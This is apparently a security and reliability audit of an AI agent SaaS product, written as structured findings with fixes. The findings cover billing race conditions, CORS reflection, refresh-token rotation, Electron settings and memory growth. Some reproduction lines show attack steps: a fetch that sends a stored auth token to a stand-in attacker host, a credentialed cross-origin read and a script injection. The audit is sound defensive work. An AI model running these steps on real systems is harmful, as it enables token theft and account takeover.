findings.title: Token balance race condition (check-then-deduct not atomic)
findings.description: Balance is read via authenticateRequest() (stale read), then later decremented atomically. Two concurrent requests can both read tokenBalance=100, both pass the >0 check, and both deduct, driving the balance negative. No WHERE tokenBalance >= cost guard on the update.
findings.scenario: Two or more concurrent chat requests from the same tenant/license
findings.impact: Users overdraw token balance. Revenue loss. Balance can go deeply negative.
findings.root_cause: Separate read (findUnique) and write (update decrement) without transaction or conditional guard
findings.reproduction: Send 5 simultaneous POST /api/v1/chat/completions with same API key when balance is low
findings.fix: Use prisma.license.updateMany({ where: { id, tokenBalance: { gte: finalCost } }, data: { tokenBalance: { decrement: finalCost } } }). Return 402 if count === 0.

findings.title: CORS reflects any origin with credentials
findings.description: Middleware reflects whatever Origin header the browser sends AND sets Access-Control-Allow-Credentials: true. Any malicious site can make authenticated cross-origin requests to the API.
findings.scenario: User visits a malicious website while logged into OmniWorker SaaS
findings.impact: CSRF/credential-stealing. Any website can make authenticated API calls on behalf of logged-in users, read tokens, user data.
findings.root_cause: const origin = request.headers.get('origin') || '*'; headers.set('Access-Control-Allow-Origin', origin);
findings.reproduction: From any website, fetch('https://saas.omniworker.com/api/v1/auth/me', {credentials:'include'}) returns user data
findings.fix: Maintain an allowlist of origins. Only reflect origins matching the allowlist. Reject others with 403.

findings.title: Refresh token family rotation is broken (no theft detection)
findings.description: Each refresh creates a token with a NEW random family instead of continuing the chain. revokeTokenFamily() exists but is NEVER called. Reuse of a revoked token fails silently instead of invalidating the entire family.
findings.scenario: Attacker steals a refresh token and uses it after the legitimate user has already refreshed
findings.impact: Token theft is not detected. The revokeTokenFamily() function is dead code. No alerting on compromise.
findings.root_cause: createRefreshToken always generates new family: const family = generateTokenFamily()
findings.reproduction: 1) Login, get refresh token A. 2) Refresh, get token B (A revoked). 3) Try to use A again - fails silently. 4) Token B remains valid (no family revocation).
findings.fix: Pass existing family to createRefreshToken. When validateRefreshToken finds a revoked token, call revokeTokenFamily(family) to invalidate the entire chain.

findings.title: Streaming tokens deducted from estimate, no reconciliation
findings.description: For streaming responses, tokens are deducted using a flat estimate (completionTokensEst=500) BEFORE the stream reaches the client. No reconciliation of actual usage afterward. Client disconnect mid-stream still charges full estimate.
findings.scenario: Every streaming chat request
findings.impact: Systematic over/undercharging. Short responses cost 500 estimated completion tokens regardless of actual length.
findings.root_cause: Token deduction happens before stream body is returned. isStream path never parses actual usage from provider.
findings.reproduction: Send a streaming request that generates a 10-token response. Check token balance - 500+ tokens deducted.
findings.fix: Use TransformStream to count SSE chunks. Deduct actual tokens after stream completion. Or use provider's usage endpoint for reconciliation.

findings.title: No check that auxiliary model context >= compressed content
findings.description: The compression prompt sent to the auxiliary model has no size check against the auxiliary model's context window. If main model has 1M context and auxiliary has 128K, the compression prompt can exceed auxiliary's limit.
findings.scenario: Main model is Claude Opus (200K+), auxiliary is gpt-4o-mini (128K), conversation has 300K+ tokens
findings.impact: Auxiliary call fails, triggers cooldown, fallback drops middle turns WITHOUT summary = silent data loss.
findings.root_cause: No estimate + compare of compression prompt size vs auxiliary model context length before call_llm
findings.reproduction: Use opus as main, mini as auxiliary. Fill conversation to 200K+ tokens. Trigger compression.
findings.fix: Before call_llm, estimate prompt size and compare against get_model_context_length(auxiliary_model). If exceeds 80%, truncate content_to_summarize further.

findings.title: Summary failure causes silent, irrecoverable data loss
findings.description: When abort_on_summary_failure is False (the default), and the summary model fails, middle turns are permanently dropped and replaced with a generic placeholder. No recovery mechanism.
findings.scenario: Summary model is temporarily down or returns empty during compression of a long conversation
findings.impact: 30+ minutes of conversation context permanently lost. User sees incoherent agent behavior.
findings.root_cause: Default abort_on_summary_failure=False; dropped messages not persisted to recovery file
findings.reproduction: Configure an invalid auxiliary model endpoint. Run a long conversation until compression triggers.
findings.fix: Change default to abort_on_summary_failure=True. Before dropping, persist dropped messages to ~/.omniworker/recovery/. Legacy False behavior should be opt-in.

findings.title: webSecurity: false disables same-origin policy
findings.description: webSecurity: false disables same-origin policy for the renderer. Combined with webviewTag: true, scripts can fetch arbitrary origins without CORS restrictions.
findings.scenario: XSS or malicious webview content in the renderer
findings.impact: Auth tokens, session data can be exfiltrated to external servers.
findings.root_cause: Workaround for CORS issues on Windows/Mac. Comment says 'temporarily' but shipped in production.
findings.reproduction: In renderer devtools: fetch('https://evil.com', {method:'POST', body: localStorage.getItem('ow_auth')})
findings.fix: Remove webSecurity: false. Configure session.webRequest.onHeadersReceived to inject CORS headers only for the SaaS API origin. Or proxy all API calls through main process IPC.

findings.title: JWT tokens stored in localStorage and plaintext .env
findings.description: JWT tokens (access + refresh) stored in localStorage (accessible to any JS in renderer) AND written to .env file on disk as OPENAI_API_KEY/CUSTOM_API_KEY. Both persist across restarts.
findings.scenario: Any script running in renderer, or any process with filesystem read access
findings.impact: Token exfiltration via XSS (especially with webSecurity: false). Plaintext credentials on disk.
findings.root_cause: Direct localStorage.setItem and omniworkerAPI.setEnv for credential persistence
findings.reproduction: Read ~/.omniworker/.env - contains JWT as OPENAI_API_KEY
findings.fix: Use Electron's safeStorage (encrypted keychain). Pass credentials to spawned processes via env vars only (not persisted to .env).

findings.title: Tool output stored without size limits
findings.description: Tool results appended to messages list as-is. enforce_turn_budget imported but not called in main dispatch. A single terminal call returning 10MB gets stored verbatim until next compression.
findings.scenario: Agent runs a command that outputs large data (ls -la on huge directory, cat of large file)
findings.impact: Memory spike. Slow compression. Context window overflow before compression triggers.
findings.root_cause: No truncation at tool-result insertion time. Truncation only happens during compression.
findings.reproduction: Ask agent to read a 5MB file. Check memory footprint.
findings.fix: Truncate tool results at insertion time to configurable max (200KB). Add [truncated: N bytes omitted] marker.

findings.title: Auth rate limit 100x more permissive without Redis
findings.description: Redis: 5 requests/15min for auth. Memory fallback: 500 requests/15min. 100x discrepancy. Without Redis, brute-force protection is effectively disabled.
findings.scenario: Production deployment without Upstash Redis configured
findings.impact: Attacker can make 500 login attempts per 15 minutes per IP.
findings.root_cause: getLimitForTier('auth') returns 500 instead of 5
findings.reproduction: Deploy without UPSTASH_REDIS_REST_URL. Send 500 login requests in 15 minutes.
findings.fix: Change getLimitForTier('auth') to return 5 to match Redis config.

findings.title: .passthrough() allows LLM parameter injection
findings.description: Chat completion schema and message objects use .passthrough(). Extra fields in request body forwarded directly to upstream LLM provider.
findings.scenario: Attacker sends extra fields like logprobs:true, tools:[...], response_format:{...}
findings.impact: Parameter injection into LLM provider APIs. Can alter model behavior or extract information.
findings.root_cause: .passthrough() on both message objects and top-level schema
findings.reproduction: POST /api/v1/chat/completions with body containing {logprobs: true, ...}
findings.fix: Remove .passthrough(). Use .strict() or explicitly define allowed optional fields.

findings.title: Unvalidated deviceFingerprint from raw body
findings.description: deviceFingerprint and deviceName extracted from raw body, bypassing Zod validation. Written directly to database.
findings.scenario: Login request with arbitrary deviceFingerprint string
findings.impact: Arbitrary strings stored in DB. No length or character validation.
findings.root_cause: const { deviceFingerprint, deviceName } = body; instead of from parsed.data
findings.reproduction: POST /api/v1/auth/login with deviceFingerprint set to a 10MB string
findings.fix: Add deviceFingerprint and deviceName to loginSchema with max length and character constraints.

findings.title: Non-atomic refresh rotation (revoke before create)
findings.description: Old refresh token revoked at line 529. If DB fails between revoke (529) and create (563), user has no valid refresh token. Not wrapped in transaction.
findings.scenario: Transient DB failure during refresh rotation
findings.impact: User permanently logged out with no recovery path except re-login.
findings.root_cause: Sequential revoke + create without prisma.$transaction()
findings.reproduction: Kill DB connection between revokeRefreshToken and createRefreshToken calls
findings.fix: Wrap revoke + create in prisma.$transaction(). Or create new token first, then revoke old.

findings.title: No rate limiting on refresh endpoint
findings.description: Refresh endpoint has no checkRateLimit call. Compare with login which does.
findings.scenario: Attacker brute-forcing token hashes on refresh endpoint
findings.impact: Unlimited refresh attempts without throttling.
findings.root_cause: Missing checkRateLimit(ip, 'auth') call
findings.reproduction: Send 1000 refresh requests in 1 minute - all accepted
findings.fix: Add checkRateLimit(ip, 'auth') at the top of the refresh handler.

findings.title: Token estimation formula inaccurate for non-English text
findings.description: chars/4 approximation. CJK text is ~1.5-2 tokens/char but 3-4 bytes UTF-8. Systematic undercharge for non-ASCII. Streaming uses flat 500-token estimate.
findings.scenario: Chinese/Japanese/Korean conversations via DeepSeek, Moonshot, Kimi providers
findings.impact: Billing inaccuracy. Non-ASCII text systematically undercharged.
findings.root_cause: Math.floor(promptCharCount / 4) — English-centric approximation
findings.reproduction: Send a chat with 1000 Chinese characters. Compare estimated vs actual tokens.
findings.fix: Use tiktoken for OpenAI models. For others, add 1.2x correction for non-ASCII-heavy messages.

findings.title: Detached processes orphan on crash
findings.description: Gateway, smart router, local LLM spawned with detached:true + unref(). If Electron crashes, processes become permanent orphans. before-quit only runs on graceful quit. EngramDaemonManager.stopDaemon() is async but not awaited.
findings.scenario: Electron crash, force-quit, or SIGKILL
findings.impact: Orphan processes consuming CPU/RAM. Port conflicts on restart.
findings.root_cause: detached:true + unref() + no crash-recovery cleanup on startup
findings.reproduction: Start gateway, then kill -9 the Electron process. Check ps aux | grep omniworker.
findings.fix: Remove detached:true. Add startup orphan cleanup. Use will-quit with async cleanup. Add SIGKILL fallback after timeout.

findings.title: No inactivity timeout on SSE stream
findings.description: timeout:120000 only applies to initial TCP connection. Once SSE stream established, no inactivity timeout. If agent hangs mid-stream, request hangs indefinitely.
findings.scenario: Agent process crashes or hangs while streaming a response
findings.impact: UI shows 'thinking...' forever. User must force-quit.
findings.root_cause: No watchdog timer that resets on each data event
findings.reproduction: Start a chat, then kill the gateway process mid-response.
findings.fix: Add setTimeout-based watchdog (90s) that resets on each res.on('data'). On timeout, call controller.abort().

findings.title: Conversation history list grows unbounded between compressions
findings.description: messages list grows by appending user/assistant/tool messages every iteration. Only reduced on compression (50% threshold). For 1M context models, threshold is 500K tokens (~2MB strings).
findings.scenario: Long conversation with many tool calls on a large-context model
findings.impact: High RAM usage between compression events. ~2MB of Python strings before trigger.
findings.root_cause: No proactive cap on messages count. Compression only triggers by token threshold.
findings.reproduction: Run 100-turn conversation with tool calls. Monitor RSS growth.
findings.fix: Cap in-memory messages at 500. Trigger proactive compression before token threshold.

findings.title: Token estimation (len+3)//4 has ±20-50% error margin
findings.description: estimate_tokens_rough uses (len(text)+3)//4. English: ~10-15% under. CJK/emoji: ~50% under. JSON tool schemas: ~10-20% over. Image: flat 1500 tokens regardless of dimensions.
findings.scenario: Any conversation, worse with non-English text or images
findings.impact: Compression triggers late for CJK → API 400 errors. Image-heavy conversations underestimate by 4x.
findings.root_cause: Single heuristic for all content types and languages
findings.reproduction: Compare estimate_tokens_rough output vs actual API usage.prompt_tokens for 100 requests.
findings.fix: Use tiktoken for OpenAI models. Add 1.2x correction for non-ASCII. Extract image dimensions for accurate per-provider cost.

findings.title: No timeout on memory provider prefetch/sync
findings.description: prefetch_all calls provider.prefetch() with no timeout. If external provider hangs, entire conversation turn blocks indefinitely.
findings.scenario: External memory provider (Honcho, Hindsight) has high latency or is down
findings.impact: Turn blocked indefinitely. User sees no response.
findings.root_cause: Synchronous call without timeout wrapper
findings.reproduction: Configure a memory provider pointing to an unresponsive endpoint. Send a message.
findings.fix: Wrap in ThreadPoolExecutor with configurable timeout (default 10s). Same for sync_all.

findings.title: 70+ tool schemas consume 20-30K tokens per API call
findings.description: All tool schemas included in full JSON on every API call. 70+ tools = 80-120KB = 20-30K tokens fixed overhead. For 128K context model, that's ~20% of the window.
findings.scenario: Any conversation with default toolset configuration
findings.impact: Reduced conversation capacity. Faster compression triggers. Higher API costs.
findings.root_cause: str(tools) includes all registered tools regardless of usage
findings.reproduction: Log len(str(tools)) on any API call. Compare to context window.
findings.fix: Lazy-load tool schemas: only include tools used in last N turns + compact index of available tools. Use tool_choice='none' for final-response calls.

findings.title: ThreadPoolExecutor retains reference to timed-out subagents
findings.description: On timeout, shutdown(wait=False) is called but worker thread may still be running. Thread holds reference to child AIAgent via closure. child.close() called but thread may continue using closed client.
findings.scenario: Subagent delegation that times out (600s)
findings.impact: Memory leak proportional to timed-out delegations. Possible errors from closed client usage.
findings.root_cause: shutdown(wait=False) doesn't kill the thread. Closure retains AIAgent reference.
findings.reproduction: Force 5 delegation timeouts. Monitor thread count and RSS.
findings.fix: Set child._force_stop=True after timeout. Use child.interrupt() aggressively. Break closure reference in finally.

findings.title: Unbounded prefetch cache string injected into every API call
findings.description: Prefetch result has no size limit. Injected into user message on every API call iteration. Misbehaving provider can return megabytes.
findings.scenario: Memory provider returns large context (e.g., Honcho with many observations)
findings.impact: Inflates every API call's input tokens. Can trigger compression on every turn.
findings.root_cause: No cap on _ext_prefetch_cache string length
findings.reproduction: Configure a memory provider that returns 100KB+ on prefetch.
findings.fix: Cap _ext_prefetch_cache at 32000 chars (~8000 tokens). Truncate with marker.

findings.title: Unbounded message history in React state, no virtualization
findings.description: messages array in React state grows without limit. MessageList renders every message as DOM node (no virtualization). Full history sent via IPC on every message.
findings.scenario: Long chat session (100+ messages with long agent responses)
findings.impact: DOM bloat, janky scrolling, multi-MB IPC payloads.
findings.root_cause: No message cap, no virtual list, full history serialized per IPC call
findings.reproduction: Run 200-message conversation. Monitor DOM node count and IPC timing.
findings.fix: Cap at 500 messages with 'load more'. Use react-window for virtualization. Limit IPC history to last 50 messages.

findings.title: Engram daemon stop Promise not awaited in before-quit
findings.description: EngramDaemonManager.stopDaemon() is async but called synchronously in before-quit. Main process may exit before SIGTERM/SIGKILL is sent.
findings.scenario: Graceful app quit
findings.impact: Engram daemon becomes orphan process.
findings.root_cause: before-quit handler doesn't await async cleanup
findings.reproduction: Quit the app. Check ps aux | grep engram.
findings.fix: Use will-quit with event.preventDefault(), await all cleanup, then app.exit(0).

findings.title: CSP allows unsafe-inline and unsafe-eval in script-src
findings.description: Content-Security-Policy includes 'unsafe-inline' and 'unsafe-eval' in script-src, defeating most XSS protection.
findings.scenario: XSS attack on SaaS dashboard
findings.impact: Arbitrary JavaScript execution despite CSP being set.
findings.root_cause: Likely required by Next.js in dev but shipped to production
findings.reproduction: Inject <script>alert(1)</script> - CSP does not block it
findings.fix: Use nonce-based CSP for Next.js scripts. Remove unsafe-eval in production.

findings.title: Streaming pipe has no error handling or billing reconciliation
findings.description: Raw upstream body piped directly to client. If upstream errors mid-stream, client gets truncated response with no error event. Tokens already deducted.
findings.scenario: Provider timeout or network issue during streaming
findings.impact: Partial/broken responses while fully charged.
findings.root_cause: No TransformStream wrapper to catch errors or inject [DONE] events
findings.reproduction: Kill upstream connection mid-stream. Check client receives no error event.
findings.fix: Wrap in TransformStream that catches errors, injects error SSE event, and reconciles billing.

findings.title: Missing database indices on frequently queried columns
findings.description: Missing indices on: TaskLog(userId, tenantId, createdAt), MasterProvider(provider, isActive), RefreshToken(family), User(tenantId).
findings.scenario: Dashboard queries, admin metrics, provider lookups at scale
findings.impact: Full table scans as data grows. Query degradation.
findings.root_cause: No @@index declarations on these columns
findings.reproduction: Query TaskLog by userId with 10K+ rows. Measure query time.
findings.fix: Add @@index declarations. Run prisma migrate.

findings.title: Float used for monetary values (price, amount)
findings.description: SubscriptionPlan.price and Invoice.amount are Float. Floating-point precision errors in billing calculations.
findings.scenario: Any billing calculation involving price arithmetic
findings.impact: Rounding errors in invoices. 0.1 + 0.2 = 0.30000000000000004.
findings.root_cause: Float type instead of Int (cents) or Decimal
findings.reproduction: Calculate total for multiple items with fractional prices.
findings.fix: Store prices in cents as Int, or use Decimal type.

findings.title: Module-level _active_subagents dict leaks on OOM kill
findings.description: Process-global dict survives across sessions. If subagent crashes without reaching finally block, entry leaks permanently.
findings.scenario: Subagent OOM kill in long-running gateway
findings.impact: Minor memory leak per leaked entry.
findings.root_cause: No periodic sweeper to clean stale entries
findings.reproduction: Hard to reproduce. Requires OOM during delegation.
findings.fix: Add periodic sweeper (60s) removing entries where thread is dead or started_at exceeds 2x timeout.

findings.title: Anti-thrashing guard can permanently disable compression
findings.description: _ineffective_compression_count >= 2 disables compression with no reset path other than /new session.
findings.scenario: Two consecutive compressions save <10% each
findings.impact: Compression disabled for rest of session. Context will eventually overflow.
findings.root_cause: No reset mechanism for the counter
findings.reproduction: Trigger compression twice with content that doesn't compress well.
findings.fix: Add reset_anti_thrashing() callable from /compress. Reset counter on model/context change.

findings.title: Inconsistent image token constants (1500 vs 1600)
findings.description: _IMAGE_TOKEN_COST=1500 in model_metadata vs _IMAGE_TOKEN_ESTIMATE=1600 in compressor. 1000-token gap for 10-image conversations.
findings.scenario: Image-heavy conversations
findings.impact: Minor estimation inconsistency between preflight and compressor.
findings.root_cause: Two separate constants for same concept
findings.reproduction: Compare pre-flight vs compressor estimates for conversation with 10 images.
findings.fix: Unify to single constant. Ideally extract actual image dimensions.

findings.title: FTS5 index never optimized after pruning
findings.description: FTS5 grows monotonically. No fts5('optimize') call. VACUUM only reclaims main table space, not FTS5 segments. Delete trigger removes entries but doesn't reclaim internal B-tree space.
findings.scenario: Months of daily usage with pruning enabled
findings.impact: Progressively slower session_search queries. Disk bloat.
findings.root_cause: No INSERT INTO messages_fts(messages_fts) VALUES('optimize') after pruning
findings.reproduction: Add 10K sessions, prune 9K, measure FTS5 query time and file size.
findings.fix: After prune_sessions, run FTS5 optimize command.

findings.title: Missing cascade deletes on most foreign keys
findings.description: Only RefreshToken has onDelete:Cascade. Deleting Tenant/User fails with FK constraint. Currently mitigated by isActive flags.
findings.scenario: Admin attempts to delete a tenant or user
findings.impact: Delete operations fail at DB level. Must use soft-delete workaround.
findings.root_cause: No onDelete policy on most relations
findings.reproduction: Try to delete a tenant with licenses, agents, task logs.
findings.fix: Add onDelete: Cascade or SetNull based on business rules.

findings.title: Expensive deepcopy in prompt_caching on every API call
findings.description: copy.deepcopy(api_messages) copies entire message list including large tool results on every API call.
findings.scenario: Every API call (runs on hot path)
findings.impact: Unnecessary CPU + memory allocation per call.
findings.root_cause: Deep-copies all messages when only 4 need modification
findings.reproduction: Profile API call with large conversation. Measure deepcopy overhead.
findings.fix: Only copy messages that will be modified (system + last 3). Use shallow copies for the rest.
